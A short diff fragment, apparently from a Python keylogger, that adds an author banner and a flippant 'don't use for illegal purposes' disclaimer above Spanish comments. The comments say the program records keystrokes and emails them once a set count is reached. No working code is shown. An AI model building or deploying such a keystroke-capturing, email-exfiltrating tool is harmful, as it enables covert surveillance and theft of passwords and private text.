@@ -1,5 +1,14 @@
+        #####################################################
+        #                      jedahee                      #
+        #####################################################
+
+###########################
 #FUNCION DEL PROGRAMA
 ###########################
+
+"""
+ Dom't use this program for illegal purposes C: 
+"""
 #Este programa lee las pulsaciones del teclado, las almacena y cuando llega a cierta cantidad te envia un correo con estas pulsaciones almacenadas
 
 #Importamos las libreias necesarias
